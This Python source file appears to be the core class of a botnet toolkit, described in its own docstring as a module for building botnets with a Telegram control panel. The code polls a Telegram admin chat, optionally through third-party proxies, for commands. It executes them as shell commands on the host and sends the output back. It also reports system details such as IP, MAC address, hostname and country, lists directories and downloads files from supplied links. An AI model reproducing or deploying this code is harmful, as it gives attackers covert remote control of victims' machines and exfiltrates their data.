# import built-in & third-party modules
import logging
import re

# import pybotnet modules
from . import util
from . import scripts
from . import settings


class PyBotNet:
    '''
    A module for building botnets with Python and Telegram control panel\n
    '''

    def __init__(
            self,
            TELEGRAM_TOKEN,
            ADMIN_CHAT_ID,
            show_log=False,
            send_system_data=True,
            is_shell=True):

        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
        self.show_log = show_log  # show logs
        self.send_system_data = send_system_data  # send system info in message
        self.is_shell = is_shell

        self.start_time = util.get_current_epoc_time()

        # logging:
        if self.show_log:
            # show all log's
            self.log_level = logging.INFO
        else:
            # off all log's
            self.log_level = 100
        self.my_logger = logging
        self.my_logger.basicConfig(level=self.log_level)
        self.logger = self.my_logger.getLogger('PyBotNet')

    def __str__(self) -> str:
        return settings.pybotnet_info

    def pybotnet_up_time(self) -> int:
        return int(util.get_current_epoc_time() - self.start_time)

    def send_message_by_third_party_proxy(self, message):
        '''Send messages by api url and third party proxy to adimn'''

        if self.send_system_data:
            message = f'{message} \n\n {util.get_short_system_info()}'

        self.api_url = util.make_send_message_api_url(
            self.TELEGRAM_TOKEN, self.ADMIN_CHAT_ID, message)

        return util.post_data_by_third_party_proxy(self.api_url, self.logger)

    def send_message(self, message):
        '''Send messages by api url to adimn'''

        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                      self.ADMIN_CHAT_ID, message)

        return util.post_data(self.api_url, self.logger)

    def get_last_command_by_third_party_proxy(self):
        '''return last admin message or False'''

        messages_list = (util.get_update_by_third_party_proxy(
            self.TELEGRAM_TOKEN, self.logger))

        # if message list not False > extract last message from admin > if last admin message not False return
        if messages_list:
            last_message = util.extract_last_admin_command(
                messages_list, self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN, self.logger)

            if last_message:
                return last_message

        return False

    def get_and_execute_scripts_by_third_party_proxy(self):
        '''
        Automatically takes the command from the telegram
         and checks whether the command is in the list of commands or not \n
        Then run it
        '''
        self.command = self.get_last_command_by_third_party_proxy()
        if self.command:

            if scripts.is_command(self.command):

                self.send_message_by_third_party_proxy(
                    f'command received: \n{self.command}')

                self.output = scripts.execute_scripts(
                    self.command, self.pybotnet_up_time(), self.is_shell, self.logger)

                if self.output:
                    self.send_message_by_third_party_proxy(
                        f'output: \n{self.output}')
            else:
                self.logger.info('invalid command')
        else:
            self.logger.info('None command')

    def get_system_info(self) -> str:
        '''
        return system info: \n
        operating system ,mac addres ,global ip, \n
        country ,pybotnet up time ,local ip,\n
        Hostname ,current route ,pid, \n
        ...more
        '''
        return scripts.get_info(self.pybotnet_up_time(), self.logger)

    def run_command_in_system(self, command: str) -> str:
        '''run system command in console and return data'''
        return scripts.cmd(command, self.is_shell, self.logger)

    def run_ls(self, route: str) -> str:
        '''return list of directory or files'''
        return scripts.ls(route)

    def download_file(self, download_link: str, file_name: str = False):
        if not file_name:
            file_name = re.findall(r'.*/(.*)$', download_link)
            file_name = (file_name[0])

        return scripts.download_manager(download_link, file_name)
